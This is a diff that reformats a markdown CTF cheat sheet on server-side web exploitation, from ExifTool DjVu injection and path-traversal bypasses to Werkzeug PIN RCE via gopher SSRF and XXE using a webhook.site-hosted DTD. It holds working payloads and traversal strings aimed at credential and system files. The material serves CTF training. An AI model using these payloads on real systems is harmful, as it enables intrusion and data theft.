@@ -1,7 +1,6 @@
 # CTF Web - Advanced Server-Side Techniques
 
 ## Table of Contents
-
 - [ExifTool CVE-2021-22204 — DjVu Perl Injection (0xFun 2026)](#exiftool-cve-2021-22204--djvu-perl-injection-0xfun-2026)
 - [Go Rune/Byte Length Mismatch + Command Injection (VuwCTF 2025)](#go-runebyte-length-mismatch--command-injection-vuwctf-2025)
 - [Zip Symlink Path Traversal (UTCTF 2024)](#zip-symlink-path-traversal-utctf-2024)
@@ -19,7 +18,7 @@
 
 See also: [server-side-advanced-2.md](server-side-advanced-2.md) for Part 2 (SSRF-to-Docker, Castor XML, Apache ErrorDocument, SQLite path traversal, HQL non-breaking space, base64 path traversal, 8.3 short filename bypass, parse_url @ bypass, PHP zip:// LFI, XSS-to-SSTI, INSERT column shift, session cookie forgery). See also: [server-side-advanced-3.md](server-side-advanced-3.md) for Part 3 (WAV polyglot, multi-slash URL bypass, Xalan math:random, SoapClient CRLF, gopher no-host, SSRF credential leak). See also: [server-side-advanced-4.md](server-side-advanced-4.md) for Part 4 (WeasyPrint SSRF, MongoDB regex injection, Pongo2 SSTI, ZIP PHP webshell, basename() bypass, wget CRLF SMTP, Gopher→MySQL SQLi, React Server Components RCE, AMQP/TLS sslsplit, CairoSVG XXE, Bazaar repo reconstruction).
 
-------
+---
 
 ## ExifTool CVE-2021-22204 — DjVu Perl Injection (0xFun 2026)
 
@@ -28,7 +27,6 @@ See also: [server-side-advanced-2.md](server-side-advanced-2.md) for Part 2 (SSR
 **Vulnerability:** DjVu ANTa annotation chunk parsed with Perl `eval`.
 
 **Craft minimal DjVu exploit:**
-
 ```python
 import struct
 
@@ -58,7 +56,7 @@ with open('exploit.djvu', 'wb') as f:
 
 **Detection:** Check ExifTool version. DjVu format is the classic vector. Upload the crafted DjVu to any endpoint that processes images with ExifTool.
 
-------
+---
 
 ## Go Rune/Byte Length Mismatch + Command Injection (VuwCTF 2025)
 
@@ -77,7 +75,7 @@ curl -X POST http://target/check -d "secret=$payload"
 
 **Detection:** Go web app with length check on `[]rune` followed by byte-level operations (copy, buffer write). Always check for rune/byte mismatch in Go.
 
-------
+---
 
 ## Zip Symlink Path Traversal (UTCTF 2024)
 
@@ -92,23 +90,20 @@ zip -y exploit.zip file.txt
 
 **Detection:** Any upload+extract endpoint. `zip -y` preserves symlinks. Many zip extraction utilities follow symlinks by default.
 
-------
+---
 
 ## Path Traversal Bypass Techniques
 
 ### Brace Stripping
-
 `{.}{.}/flag.txt` → `../flag.txt` after processing
 
 ### Double URL Encoding
-
 `%252E%252E%252F` → `../` after two decode passes
 
 ### Python os.path.join
-
 `os.path.join('/app/public', '/etc/passwd')` → `/etc/passwd` (absolute path ignores prefix)
 
-------
+---
 
 ### Nginx Alias Traversal to Leak .env (VolgaCTF 2018)
 
@@ -150,7 +145,6 @@ if r.status_code == 200:
 ```
 
 **Detection checklist:**
-
 ```text
 # Test for the misconfiguration on common paths:
 /static../
@@ -164,7 +158,7 @@ if r.status_code == 200:
 
 **Key insight:** When an Nginx `location` directive lacks a trailing slash but its `alias` has one, the path is joined unsafely, allowing `..` traversal out of the aliased directory. This is a common misconfiguration in Laravel deployments where `/laravel` maps to the `public/` directory. Always check for trailing slash mismatches between `location` and `alias` directives.
 
-------
+---
 
 ## Unicode Homoglyph Path Traversal U+2E2E (CSAW 2017)
 
@@ -194,7 +188,6 @@ print(r.text)
 ```
 
 **Other Unicode dot homoglyphs to try:**
-
 ```text
 U+2E2E  ⸮  REVERSED QUESTION MARK  (E2 B8 AE) → .
 U+FF0E  ．  FULLWIDTH FULL STOP     (EF BC 8E) → .
@@ -204,7 +197,7 @@ U+FE52  ﹒  SMALL FULL STOP        (EF B9 92) → .
 
 **Key insight:** Unicode normalization inconsistencies between the validation layer and execution layer enable path traversal with non-ASCII dot homoglyphs. U+2E2E is a lesser-known alternative to fullwidth tricks (U+FF0E). Test normalization forms NFKC and NFC — Python's `unicodedata.normalize('NFKC', char)` reveals what each character collapses to.
 
-------
+---
 
 ## Ruby Regexp.escape Multibyte Character Bypass (Square CTF 2017)
 
@@ -238,7 +231,6 @@ r = requests.get("http://target/search", params={"q": payload})
 ```
 
 **Exploitation scenario:**
-
 ```ruby
 # Vulnerable code:
 pattern = /#{Regexp.escape(user_input)}/
@@ -253,7 +245,7 @@ end
 
 **Key insight:** Byte-level escaping functions are vulnerable to multibyte character injection. A GBK/Big5 lead byte (0xBF) followed by 0x5C forms a valid single character, consuming the backslash that `Regexp.escape` just added. This leaves subsequent characters unescaped. Check for non-ASCII input handling in Ruby regex validation, especially when the application supports CJK character sets.
 
-------
+---
 
 ## /dev/fd Symlink to Bypass /proc Filter (Google CTF 2017)
 
@@ -277,7 +269,6 @@ curl "http://target/?f=/dev/fd/3"   # often a database or config file
 ```
 
 **Other /proc filter bypass paths:**
-
 ```text
 /dev/fd/../environ         # → /proc/self/environ
 /dev/fd/../cmdline         # → /proc/self/cmdline
@@ -289,16 +280,14 @@ curl "http://target/?f=/dev/fd/3"   # often a database or config file
 
 **Key insight:** `/dev/fd` is a symlink to `/proc/self/fd` on Linux. Traversing up with `../` reaches `/proc/self/`, bypassing blocklist checks for the literal string `/proc`. Similarly, `/dev/stdin`, `/dev/stdout`, and `/dev/stderr` link into `/proc/self/fd/` and can be used as traversal pivot points. Always test these alternatives when `/proc` is blacklisted.
 
-------
+---
 
 ## Flask/Werkzeug Debug Mode Exploitation
 
 **Pattern (Meowy, Nullcon 2026):** Flask app with Werkzeug debugger enabled + weak session secret.
 
 **Attack chain:**
-
 1. **Session secret brute-force:** When secret is generated from weak RNG (e.g., `random_word` library, short strings):
-
    ```bash
    flask-unsign --unsign --cookie "eyJ..." --wordlist wordlist.txt
    # Or brute-force programmatically:
@@ -308,26 +297,17 @@ curl "http://target/?f=/dev/fd/3"   # often a database or config file
            print(f"Secret: {word}, Data: {data}")
        except: pass
    ```
-
 2. **Forge admin session:** Once secret is known, forge `is_admin=True`:
-
    ```bash
    flask-unsign --sign --cookie '{"is_admin": true}' --secret "found_secret"
-   
    ```
-
 3. **SSRF via pycurl:** If `/fetch` endpoint uses pycurl, target `http://127.0.0.1/admin/flag`
-
 4. **Header bypass:** Some endpoints check `X-Fetcher` or similar custom headers — include in SSRF request
 
 **Werkzeug debugger RCE:** If `/console` is accessible:
-
 1. **Read system identifiers via SSRF:** `/etc/machine-id`, `/sys/class/net/eth0/address`
-
 2. **Get console SECRET:** Fetch `/console` page, extract `SECRET = "..."` from HTML
-
 3. **Compute PIN cookie:**
-
    ```python
    import hashlib
    h = hashlib.sha1()
@@ -339,34 +319,28 @@ curl "http://target/?f=/dev/fd/3"   # often a database or config file
    num = f"{int(h.hexdigest(), 16):09d}"[:9]
    pin = "-".join([num[:3], num[3:6], num[6:]])
    pin_hash = hashlib.sha1(f"{pin} added salt".encode()).hexdigest()[:12]
-   
    ```
-
 4. **Execute via gopher SSRF:** If direct access is blocked, use gopher to send HTTP request with PIN cookie:
-
    ```python
    cookie = f"{cookie_name}={int(time.time())}|{pin_hash}"
    req = f"GET /console?__debugger__=yes&cmd={cmd}&frm=0&s={secret} HTTP/1.1\r\nHost: 127.0.0.1:5000\r\nCookie: {cookie}\r\n\r\n"
    gopher_url = "gopher://127.0.0.1:5000/_" + urllib.parse.quote(req)
    # SSRF to gopher_url
-   
    ```
 
 **Key insight:** Even when Werkzeug console is only reachable from localhost, the combination of SSRF + gopher protocol allows full PIN bypass and RCE. The PIN trust cookie authenticates the session without needing the actual PIN entry.
 
-------
+---
 
 ## XXE with External DTD Filter Bypass
 
 **Pattern (PDFile, PascalCTF 2026):** Upload endpoint filters keywords ("file", "flag", "etc") in uploaded XML, but external DTD fetched via HTTP is NOT filtered.
 
 **Technique:** Host malicious DTD on webhook.site or attacker server:
-
 ```xml
 <!-- Remote DTD (hosted on webhook.site) -->
 <!ENTITY % data SYSTEM "file:///app/flag.txt">
 <!ENTITY leak "%data;">
-
 ```
 
 ```xml
@@ -374,37 +348,31 @@ curl "http://target/?f=/dev/fd/3"   # often a database or config file
 <?xml version="1.0"?>
 <!DOCTYPE book SYSTEM "http://webhook.site/TOKEN">
 <book><title>&leak;</title></book>
-
 ```
 
 **Key insight:** XML parser fetches and processes external DTD without applying the upload keyword filter. Response includes flag in parsed field.
 
 **Setup with webhook.site API:**
-
 ```python
 import requests
 TOKEN = requests.post("https://webhook.site/token").json()["uuid"]
 dtd = '<!ENTITY % d SYSTEM "file:///app/flag.txt"><!ENTITY leak "%d;">'
 requests.put(f"https://webhook.site/token/{TOKEN}/request/...",
              json={"default_content": dtd, "default_content_type": "text/xml"})
-
 ```
 
-------
+---
 
 ## Path Traversal: URL-Encoded Slash Bypass
 
 **`%2f` bypass:** Nginx route matching doesn't decode `%2f` but filesystem does:
-
 ```bash
 curl 'https://target/public%2f../nginx.conf'
 # Nginx sees "/public%2f../nginx.conf" → matches /public/ route
 # Filesystem resolves to /public/../nginx.conf → /nginx.conf
-
 ```
-
 **Also try:** `%2e` for dots, double encoding `%252f`, backslash `\` on Windows.
 
-------
+---
 
 See [server-side-advanced-4.md](server-side-advanced-4.md) for WeasyPrint SSRF, MongoDB regex injection, Pongo2 SSTI, ZIP PHP webshell, basename() bypass, wget CRLF SMTP, Gopher→MySQL SQLi, React Server Components RCE, AMQP/TLS interception, CairoSVG XXE, and Bazaar repo reconstruction.
